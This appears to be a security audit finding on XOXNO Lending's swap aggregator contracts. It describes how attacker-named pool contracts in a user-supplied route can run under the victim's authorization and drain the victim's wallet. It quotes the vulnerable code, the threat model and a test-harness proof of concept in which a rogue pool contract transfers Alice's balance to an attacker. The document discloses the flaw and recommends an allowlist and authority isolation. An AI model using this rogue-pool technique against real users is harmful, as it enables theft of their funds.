### Title
Unsanitized route payload lets attacker-named pool contracts execute arbitrary code inside the caller's authorization tree, draining the caller's wallet - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The `@npmcli/git` advisory is a command-injection bug: unsanitized user input was passed to a privileged execution context (a shell), so the attacker could run arbitrary commands. The analog in XOXNO Lending is the swap-route payload: controller strategy entrypoints forward caller-controlled route bytes to the swap aggregator, which invokes whatever pool and token contracts the payload names with `authorize_as_current_contract`, placing attacker-deployed code on the call stack *below the caller's `require_auth` root frame*. Any `token.transfer(victim, attacker, amount)` issued by that rogue contract is recorded by the host as a child of the victim's own authorization entry and executes if the victim signs the simulated auth tree — arbitrary code execution with the victim's authority, resulting in theft of any tokens in the victim's wallet.

### Finding Description
Every routed strategy (`multiply`, `swap_debt`, `swap_collateral`, `repay_debt_with_collateral`) funnels into `swap_tokens`, which builds an `execute_strategy` call carrying the raw user-supplied `swap: &StrategySwap` bytes to the router. [1](#0-0) 

The controller scopes its own grant correctly — one exact `authorize_transfer_as_current` for the input token — but neither the controller nor the router constrains *which* contracts the route executes. The threat model states this plainly: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization." [2](#0-1) 

Each venue adapter invokes `ctx.hop.pool` — an address taken verbatim from the caller-supplied `StrategyPayload` — via `env.invoke_contract`, e.g. the Comet adapter calls `swap_exact_amount_in` on the payload-named pool and Soroswap/Phoenix/Sushi do likewise. [3](#0-2) [4](#0-3) 

Because `caller.require_auth()` at the controller entrypoint frames the entire call, an attacker-registered "pool" can call `token::Client::transfer(victim, attacker, amount)` on *any* token the victim holds — including tokens the protocol never listed — and the host records that transfer as a sub-invocation of the victim's `swap_collateral`/`multiply` auth entry. The harness test demonstrates this end-to-end: simulation records `wallet_token.transfer(alice → attacker, WALLET_BALANCE)` under Alice's `swap_collateral` entry, and enforcing mode executes it once Alice signs that tree. [5](#0-4) [6](#0-5) [7](#0-6) 

### Impact Explanation
Theft of user funds. The rogue route contract drains *any* token in the victim's wallet — not just the routed input, not just supplied collateral — up to the full wallet balance, in the same transaction that delivers a perfectly fair swap (so on-chain checks like `RouterOverspend`, `NoSwapOutput`, min-out, and the final health-factor gate all pass). The test shows Alice's entire `WALLET_BALANCE` of an unrelated token transferred to the attacker while her position received fair `ETH` output. The loss is unbounded by `amount_in` and by every slippage/risk control in the system.

### Likelihood Explanation
A single unprivileged attacker submits a route to a victim through the normal off-chain quoting/simulation flow: any front-end, quote service, or phishing vector that gets a user to sign a `swap_collateral`/`multiply`/`swap_debt`/`repay_debt_with_collateral` transaction whose simulated auth tree contains the extra child transfer succeeds. Simulation faithfully records the malicious child entry, so the poisoned tree is exactly what a signing wallet is asked to approve. Nothing on-chain prevents it — the defense rests entirely on the client decoding the route and rejecting unexpected auth-tree children, which the threat model itself identifies as a caller obligation, not a protocol guarantee.

### Recommendation
Treat route venue addresses as untrusted code, the way `npmcli/git` learned to treat arguments as data rather than shell input:

1. Enforce a venue/pool allowlist (per-venue registry of recognized pool contracts) inside the router's `dispatch_hop` so a payload can only reach known DEX contracts — the direct analog of "stop running untrusted input through a shell."
2. Alternatively or additionally, isolate the victim's authority: have the controller execute router hops through an intermediate contract holding only the exact input authorization, so no `caller.require_auth` frame remains on the stack during venue calls.
3. Until fixed, wallets/integrators must decode every route payload and refuse signatures on authorization trees containing any child other than the single expected input-token `transfer`, per the threat-model guidance.

### Proof of Concept
Reachable path: attacker crafts a `StrategyPayload` whose hop's `pool` is an attacker-deployed contract, and whose `token_in`/`token_out` are legitimate listed assets (e.g. USDC→ETH). Victim calls `controller.swap_collateral(caller, account_id, usdc_key, 50_000_000_000, eth_key, route)` → `swap_tokens` (`contracts/controller/src/strategies/swap.rs:36-38`) → `router.execute_strategy` → `dispatch_hop` invokes `RoguePool::swap` → `RoguePool` executes `token.transfer(victim, attacker, WALLET_BALANCE)` on an unrelated wallet token. The host records the transfer as a child of the victim's `swap_collateral` auth entry; when the victim signs the simulated tree, the transfer executes. This is demonstrated by `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`, where `swap_collateral` succeeds, Alice's wallet balance goes to 0, the attacker receives `WALLET_BALANCE`, and Alice's ETH supply credit is the fair `FAIR_OUT_ETH` — every protocol check passes while the theft commits.

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** contracts/swap-aggregator/src/venues/comet.rs (L30-34)
```rust
    let _: (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "swap_exact_amount_in"),
        args,
    );
```

**File:** contracts/swap-aggregator/src/venues/phoenix.rs (L23-25)
```rust
    let _: i128 = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
